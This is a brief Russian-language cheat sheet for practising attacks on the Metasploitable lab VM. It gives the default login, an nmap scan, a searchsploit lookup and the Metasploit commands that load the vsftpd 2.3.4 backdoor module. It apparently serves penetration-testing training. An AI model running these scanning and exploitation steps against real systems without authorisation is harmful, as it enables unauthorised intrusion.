# Конспект по эксплуатации уязвимостей Metasploitable

## Учётные данные ОС Metasploitable
    msfadmin:msfadmin

## Подключение по SSH с устаревшими протоколами шифрования
    ssh -o HostKeyAlgorithms=+ssh-rsa,ssh-dss msfadmin@192.168.1.67

## Сканирование целевого хоста с сохранением результата в **``.xml``**
    nmap -sV 192.168.1.67 -oX ./searchsploit/scan_host.xml

## Запуск **``Metasploit``**
    msfconsole

## Поиск уязвимости через **``searchsploit``**
    searchsploit vsftpd 2.3.4

Если в выводе есть пометка **(Metasploit)**, значит существует готовый модуль для **``Metasploit``**.

Пример вывода:
    $ searchsploit vsftpd 2.3.4
    Exploit Title                                                        
    --------------------------------------------------------------------- 
    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)               

## Поиск модуля в **``Metasploit``**
    search vsftpd 2.3.4

## Загрузка найденного модуля
    use exploit/unix/ftp/vsftpd_234_backdoor

## Повышение уровня детализации
    setg VERBOSE true

## Просмотр опций модуля
    show options

## Вывод списка доступных полезных нагрузок (payload) для модуля
    show payloads